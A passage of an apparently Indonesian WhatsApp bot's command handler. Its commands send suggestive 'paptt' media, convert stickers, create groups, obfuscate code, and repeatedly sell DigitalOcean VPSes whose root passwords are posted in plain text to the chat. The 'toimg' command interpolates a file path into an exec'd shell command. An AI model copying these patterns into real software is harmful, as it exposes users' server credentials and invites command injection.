            let papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
            let titid1 = (pickRandom(papttfoto))
            let titid2 = (pickRandom(papttvideo))
            if (q == 'foto') {
                reply("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
                Biiofc.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            } else if (q == 'video') {
                reply("Video Akan Dikirim Lewat Private Chat ( *PC* )")
                Biiofc.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            }
        break
        case "sosmed": {
const text12 = `*Hi @${sender.split("@")[0]} 👋*

*ALL SOSMED OWNER* \n\n*INSTAGRAM OWNER :*\n${instagramOwner2}\n*YOUTUBE OWNER :*\n${youtubeOwner1}\n*TELEGRAM OWNER :*\n${telegramOwner1}\n*GROUP OWNER :* \n${grupOwner1}\n*WHATSAPP OWNER*\n6282125002189
▬▭▬▭▬▭▬▭▬▭▬▭▬`
 
Biiofc.sendMessage(from, { image: thumbnail1, caption: text12, mentions:[sender] }, { quoted: fkontak })
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender], forwardingScore: 9999, isForwarded: true }}, { quoted: fkontak })
} sound = fs.readFileSync('./freya/audio6.mp3')
Biiofc.sendMessage(m.chat, {audio: sound, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case 'enc': {
            if (!isOwner) return reply(mess.owner)
            if (!q) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            reply(`${meg.result}`)
        }
        break
case 'buatgc':
            if (!isPremium) return reply(mess.premium)
            if (!text) return reply('_Masukkan Nama Grup!_')
            try{
                reply(mess.wait)
                let group = await Biiofc.groupCreate(text, [m.sender])
                let link = await Biiofc.groupInviteCode(group.gid)
                let url = 'https://chat.whatsapp.com/' + link;
                /// console.log(chalk.bold.red('Membuat Grup: ' + group.gid + '\nNama Grup: ' + text + '\n\nViolet'))
                reply('_Berhasil Membuat Grup *' + text + '*_\n\n*Nama:* ' + text + '\n*ID:* ' + group.gid + '\n*Link:* ' + url)
            } catch (e) {
                let [namagc, partici] = text.split('|')
                if (!namagc) return reply('Format Salah!!!')
                if (!partici) return reply('Tag user sebagai member baru!')
                let mem = Biiofc.parseMention(`@${parseInt(m.sender)} ${partici}`)
                let ha = await Biiofc.groupCreate(namagc, mem).catch(console.error)
                console.log(JSON.stringify(ha));
                await reply(`*GROUP CREATE*

\`\`\`Group Telah Dibuat @${m.sender.replace(/@.+/, '')}\`\`\`


${JSON.stringify(ha.participants)}`)
                Biiofc.groupMakeAdmin(ha.gid, [m.sender])
                if (!isOwner) {
                    await Biiofc.modifyChat(ha.gid, 'delete', {
                        includeStarred: false
                    }).catch(console.error)
                    Biiofc.groupLeave(ha.gid)
                }
            }
        break
case 'toaud': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await Biiofc.downloadMediaMessage(quoted)
let { toAudio } = require('./freya/converter')
let audio = await toAudio(media, 'mp4')
Biiofc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tovn': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./freya/converter')
let audio = await toPTT(media, 'mp4')
Biiofc.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6282192773770',
title: `Hardz Offcial`,
sourceUrl: `https://wa.me/6282192773770`, 
thumbnail: thumb
}
}})
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
  let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
  if (!/image/.test(mime)) throw respond
  if (!text) throw respond
  reply(`Proses Tuan...`)
  let atas = text.split('|')[0] ? text.split('|')[0] : '-'
  let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  let { TelegraPh } = require('./freya/uploader')
  try {
  let mee = await Biiofc.downloadAndSaveMediaMessage(quoted)
  let mem = await TelegraPh(mee)
  let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
  let awikwok = await Biiofc.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(awikwok)
  } catch (e) {
  reply(`Sedang Maintenance Tuan`)
  }
  }
  break 
case 'togif': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./freya/uploader')
let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Biiofc.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
case 'toimg': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return reply(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await Biiofc.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            Biiofc.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return reply(`Please reply to non animated sticker`)
    }
    break
case 'tomp4': case 'tovideo': {
                if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                if (!quoted) return reply('Reply to Sticker')
                if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
		        let { webp2mp4File } = require('./freya/uploader')
                let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Biiofc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'tourl': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./freya/uploader')
let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'getbio':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Biiofc.fetchStatus(who)
    reply(bio.status)
  } catch {
    if (text) return reply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Biiofc.fetchStatus(who)
      reply(bio.status)
    } catch {
      return reply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
case "sticker": 
case "s": {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Biiofc.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await Biiofc.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'addlist':
            if (!m.isGroup) return reply(mess.group)
            if (!isAdmins && !isOwner) return reply(mess.botAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
            if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            addResponList(m.chat, args1, args2, false, '-', db_respon_list)
            reply(`Berhasil menambah List menu : *${args1}*`)
        break
        
        case 'dellist':{
            if (!m.isGroup) return reply(mess.group)
            if (!isAdmins && !isOwner) return reply(mess.botAdmin)
            if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
            var arr_rows = [];
            for (let x of db_respon_list) {
            if (x.id === m.chat) {
            newReply(`Mau Delete Yang Mana?\n\n${x.key}`)
        }}
        }
        break
 case "buypaketvps1g1c": {
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 20000, db_saldo)
break

    case "buypaketvps2g1c": {
if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 25000, db_saldo)
break  
 
    case "buypaketvps2g2c": {
if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 30000, db_saldo)
break      
    case "buypaketvps4g2c": {
if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 45000, db_saldo)
break        
     case "buypaketvps8g4c": {
if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 55000, db_saldo)
break
    case "vps1g1c": {
if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
